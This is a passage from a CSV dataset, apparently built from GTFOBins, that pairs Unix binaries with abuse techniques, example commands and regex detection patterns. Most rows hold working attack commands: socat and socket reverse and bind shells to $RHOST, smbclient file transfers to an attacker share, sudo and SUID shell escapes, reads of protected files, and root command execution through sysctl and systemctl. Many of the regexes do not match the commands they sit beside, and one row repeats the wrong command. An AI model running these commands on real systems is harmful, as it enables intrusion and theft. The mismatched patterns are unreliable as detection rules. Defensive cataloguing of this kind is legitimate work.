!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?smbclient\s+(?:/bin/(?:sh|bash))),
smbclient,file-upload,smbclient '\\attacker\share' -c 'put file_to_send where_to_save',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?smbclient\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.
smbclient,file-download,smbclient '\\attacker\share' -c 'put file_to_send where_to_save',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?smbclient\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.
smbclient,sudo,"sudo smbclient '\\attacker\share'
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?smbclient\s+(?:/bin/(?:sh|bash))),
snap,sudo,sudo snap install xxxx_1.0_all.snap --dangerous --devmode,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?snap\s*\-\-dangerous\s*\-\-devmode\s+.+),"It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' ""$COMMAND"" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
"
socat,shell,socat stdin exec:/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash))),The resulting shell is not a proper TTY shell and lacks the prompt.
socat,reverse-shell,"socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
socat,bind-shell,"socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell."
socat,file-upload,socat -u file:$LFILE tcp-connect:$RHOST:$RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s*\-u\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file."
socat,file-download,"socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s*\-u\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file."
socat,file-read,"socat -u ""file:$LFILE"" -","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s*\-u\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
socat,file-write,"socat -u 'exec:echo DATA' ""open:$LFILE,creat""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s*\-u\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
socat,sudo,sudo socat stdin exec:/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash))),The resulting shell is not a proper TTY shell and lacks the prompt.
socat,limited-suid,"./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socat\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
socket,reverse-shell,socket -qvp '/bin/sh -i' $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socket\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
socket,bind-shell,socket -svp '/bin/sh -i' $LPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?socket\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
soelim,file-read,"soelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?soelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
soelim,suid,"./soelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?soelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
soelim,sudo,"sudo soelim ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?soelim\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
softlimit,shell,softlimit /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?softlimit\s+(?:/bin/(?:sh|bash))),
softlimit,suid,./softlimit /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?softlimit\s*\-p\s+(?:/bin/(?:sh|bash))),
softlimit,sudo,sudo softlimit /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?softlimit\s+(?:/bin/(?:sh|bash))),
sort,file-read,"sort -m ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sort\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sort,suid,"./sort -m ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sort\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sort,sudo,"sudo sort -m ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sort\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
split,file-read,"split $LFILE $TF
cat $TF*","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
split,file-write,"echo DATA >$TF
split -b999m $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Data will be written in the current directory in a file named `xaa` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough."
split,file-write,"echo DATA >$TF
split -b999m --additional-suffix $EXTENSION $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-additional\-suffix\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough."
split,command,split --filter=$COMMAND $TF,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-filter\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Command execution using an existing or newly created file.
split,command,echo | split --filter=$COMMAND /dev/stdin,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-filter\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Command execution using stdin (and close it directly).
split,shell,split --filter=/bin/sh /dev/stdin,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-filter\s+(?:/bin/(?:sh|bash))),The shell prompt is not printed.
split,sudo,sudo split --filter=/bin/sh /dev/stdin,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?split\s*\-\-filter\s+(?:/bin/(?:sh|bash))),The shell prompt is not printed.
sqlite3,shell,sqlite3 /dev/null '.shell /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:/bin/(?:sh|bash))),
sqlite3,file-write,"sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sqlite3,file-read,"sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sqlite3,suid,"sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sqlite3,sudo,sudo sqlite3 /dev/null '.shell /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:/bin/(?:sh|bash))),
sqlite3,limited-suid,./sqlite3 /dev/null '.shell /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlite3\s+(?:/bin/(?:sh|bash))),
sqlmap,shell,"sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlmap\s*\-u\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b))",
sqlmap,sudo,"sudo sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sqlmap\s*\-u\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b))",
ss,file-read,ss -a -F $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ss,suid,./ss -a -F $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ss,sudo,sudo ss -a -F $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ss\s*\-a\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ssh-agent,shell,ssh-agent /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s+(?:/bin/(?:sh|bash))),
ssh-agent,suid,./ssh-agent /bin/ -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s*\-p\s+.+),
ssh-agent,sudo,sudo ssh-agent /bin/,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-agent\s+.+),
ssh-keygen,library-load,ssh-keygen -D ./lib.so,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.+),
ssh-keygen,sudo,sudo ssh-keygen -D ./lib.so,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.+),
ssh-keygen,suid,./ssh-keygen -D ./lib.so,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keygen\s*\-D\s+.+),
ssh-keyscan,file-read,ssh-keyscan -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ssh-keyscan,suid,./ssh-keyscan -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ssh-keyscan,sudo,sudo ssh-keyscan -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\-keyscan\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ssh,shell,ssh localhost $SHELL --noprofile --norc,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-\-noprofile\s*\-\-norc\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Reconnecting may help bypassing restricted shells.
ssh,shell,ssh -o ProxyCommand=';sh 0<&2 1>&2' x,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s+.+),Spawn interactive shell through ProxyCommand option.
ssh,shell,ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s*\-o\s+(?:/bin/(?:sh|bash))),"Spawn interactive shell on client, requires a successful connection towards `host`."
ssh,file-upload,"ssh $HOST ""cat > $RPATH"" < $LPATH","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a SSH server.
ssh,file-download,"ssh $HOST ""cat $RPATH"" > $LPATH","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a SSH server.
ssh,file-read,ssh -F $LFILE localhost,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is corrupted by error prints.
ssh,sudo,sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ssh\s*\-o\s+.+),Spawn interactive root shell through ProxyCommand option.
sshpass,shell,sshpass /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s+(?:/bin/(?:sh|bash))),
sshpass,suid,./sshpass /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s*\-p\s+(?:/bin/(?:sh|bash))),
sshpass,sudo,sudo sshpass /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sshpass\s+(?:/bin/(?:sh|bash))),
start-stop-daemon,shell,start-stop-daemon -n $RANDOM -S -x /bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
start-stop-daemon,suid,./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
start-stop-daemon,sudo,sudo start-stop-daemon -n $RANDOM -S -x /bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?start\-stop\-daemon\s*\-n\s*\-S\s*\-x\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
stdbuf,shell,stdbuf -i0 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s+(?:/bin/(?:sh|bash))),
stdbuf,suid,./stdbuf -i0 /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s*\-p\s+(?:/bin/(?:sh|bash))),
stdbuf,sudo,sudo stdbuf -i0 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?stdbuf\s+(?:/bin/(?:sh|bash))),
strace,file-write,strace -s 999 -o $LFILE strace - DATA,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-s\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`."
strace,shell,strace -o /dev/null /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s+(?:/bin/(?:sh|bash))),
strace,suid,./strace -o /dev/null /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s*\-p\s+(?:/bin/(?:sh|bash))),
strace,sudo,sudo strace -o /dev/null /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strace\s*\-o\s+(?:/bin/(?:sh|bash))),
strings,file-read,"strings ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strings\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
strings,suid,"./strings ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strings\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
strings,sudo,"sudo strings ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strings\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
su,sudo,sudo su,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?su\s+.+),
sudo,sudo,sudo sudo /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sudo\s+(?:/bin/(?:sh|bash))),
sysctl,command,"sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The command is executed by root in the background when a core dump occurs.
sysctl,file-read,"/usr/sbin/sysctl -n ""/../../$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s*\-n\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files."
sysctl,suid,"./sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sysctl,sudo,"sudo sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
systemctl,suid,"echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c ""id > /tmp/output""
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s*\-c\s*\-\-now\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
systemctl,sudo,"echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
systemctl,sudo,"echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c ""id > /tmp/output""
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s*\-c\s*\-\-now\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
systemctl,sudo,"sudo systemctl
!sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s+.+),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
systemd-resolve,sudo,"sudo systemd-resolve --status
!sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemd\-resolve\s*\-\-status\s+.+),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
tac,file-read,"tac -s 'RANDOM' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tac,suid,"./tac -s 'RANDOM' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tac,sudo,"sudo tac -s 'RANDOM' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tail,file-read,"tail -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tail\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tail,suid,"./tail -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tail\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tail,sudo,"sudo tail -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tail\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tar,shell,tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-checkpoint\s*\-\-checkpoint\-action\s+(?:/bin/(?:sh|bash))),
tar,shell,"tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-I\s*\-c\s+(?:/bin/(?:sh|bash))),This only works for GNU tar.
tar,shell,"echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-to\-command\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar. It can be useful when only a limited command argument injection is available.
tar,file-upload,tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-rsh\-command\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
tar,file-download,tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-rsh\-command\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
tar,file-write,"echo DATA > ""$TF""
